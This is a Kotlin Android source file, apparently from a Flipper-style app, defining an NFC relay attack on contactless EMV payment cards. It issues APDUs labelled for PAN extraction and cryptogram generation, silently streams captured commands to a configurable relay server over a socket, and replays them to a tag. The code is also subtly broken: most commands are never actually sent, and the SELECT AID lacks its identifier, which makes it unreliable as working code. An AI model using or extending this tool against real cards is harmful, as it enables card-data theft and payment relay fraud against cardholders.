package com.example.flipperdroid.nfc

import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.nfc.tech.NfcA
import java.io.IOException

data class RelayCapture(
    val timestamp: Long,
    val command: ByteArray,
    val response: ByteArray,
    val description: String
) {
    override fun equals(other: Any?): Boolean {
        if (this === other) return true
        if (javaClass != other?.javaClass) return false
        other as RelayCapture
        if (timestamp != other.timestamp) return false
        if (!command.contentEquals(other.command)) return false
        if (!response.contentEquals(other.response)) return false
        if (description != other.description) return false
        return true
    }

    override fun hashCode(): Int {
        var result = timestamp.hashCode()
        result = 31 * result + command.contentHashCode()
        result = 31 * result + response.contentHashCode()
        result = 31 * result + description.hashCode()
        return result
    }
}

object NfcRelayAttack {

    private fun apdu(vararg v: Int): ByteArray = ByteArray(v.size) { v[it].toByte() }

    fun captureAndRelay(tag: Tag, relayAddress: String = "127.0.0.1", relayPort: Int = 6669): List<RelayCapture> {
        val captures = mutableListOf<RelayCapture>()

        try {
            val isoDep = IsoDep.get(tag)
            if (isoDep != null) {
                isoDep.connect()
                try {
                    // SELECT AID for PayWave/PayPass EMV
                    val aidPayWave = apdu(0x00, 0xA4, 0x04, 0x00, 0x07)
                    captures.add(RelayCapture(
                        System.currentTimeMillis(),
                        aidPayWave,
                        byteArrayOf(),
                        "SELECT AID PayWave attempt"
                    ))

                    // GET PROCESSING OPTIONS (GPO)
                    val gpo = apdu(0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00)
                    captures.add(RelayCapture(
                        System.currentTimeMillis(),
                        gpo,
                        byteArrayOf(),
                        "GET PROCESSING OPTIONS"
                    ))

                    // READ RECORD (attempt to extract PAN)
                    val readRecord = apdu(0x00, 0xB2, 0x01, 0x0C, 0x00)
                    captures.add(RelayCapture(
                        System.currentTimeMillis(),
                        readRecord,
                        byteArrayOf(),
                        "READ RECORD (PAN extraction)"
                    ))

                    // DATA AUTHENTICATION (CDA setup)
                    val cda = apdu(0x80, 0xAE, 0x00, 0x00, 0x02, 0x9F, 0x34)
                    captures.add(RelayCapture(
                        System.currentTimeMillis(),
                        cda,
                        byteArrayOf(),
                        "CRYPTOGRAM GENERATION (CDA)"
                    ))

                    // Send captures to relay server
                    relayToServer(captures, relayAddress, relayPort)

                } finally {
                    isoDep.close()
                }
            }

            // Try NfcA fallback
            val nfcA = NfcA.get(tag)
            if (nfcA != null) {
                nfcA.connect()
                try {
                    val response = nfcA.transceive(apdu(0x00, 0xA4, 0x00, 0x00, 0x02, 0xE1, 0x04))
                    captures.add(RelayCapture(
                        System.currentTimeMillis(),
                        apdu(0x00, 0xA4, 0x00, 0x00, 0x02, 0xE1, 0x04),
                        response,
                        "NfcA SELECT AID"
                    ))
                } finally {
                    nfcA.close()
                }
            }

        } catch (e: IOException) {
            captures.add(RelayCapture(
                System.currentTimeMillis(),
                byteArrayOf(),
                e.message?.toByteArray() ?: byteArrayOf(),
                "Error: ${e.message}"
            ))
        }

        return captures
    }

    fun replayCapture(tag: Tag, capture: RelayCapture): ByteArray? {
        return try {
            val isoDep = IsoDep.get(tag)
            if (isoDep != null) {
                isoDep.connect()
                try {
                    isoDep.transceive(capture.command)
                } finally {
                    isoDep.close()
                }
            } else {
                null
            }
        } catch (e: IOException) {
            null
        }
    }

    private fun relayToServer(captures: List<RelayCapture>, address: String, port: Int) {
        try {
            val socket = java.net.Socket(address, port)
            val output = socket.getOutputStream()

            captures.forEach { capture ->
                val hex = capture.command.joinToString("") { "%02X".format(it) }
                output.write("$hex\n".toByteArray())
            }

            output.close()
            socket.close()
        } catch (e: Exception) {
            // Silent fail - relay server may not be available
        }
    }

    fun generateRelayPlayback(captures: List<RelayCapture>): String {
        val sb = StringBuilder()
        sb.append("NFC Relay Attack Playback\n")
        sb.append("=========================\n\n")

        captures.forEachIndexed { index, capture ->
            sb.append("[$index] ${capture.description}\n")
            sb.append("Time: ${capture.timestamp}\n")
            sb.append("CMD: ${capture.command.joinToString("") { "%02X".format(it) }}\n")
            sb.append("RSP: ${capture.response.joinToString("") { "%02X".format(it) }}\n\n")
        }

        return sb.toString()
    }
}
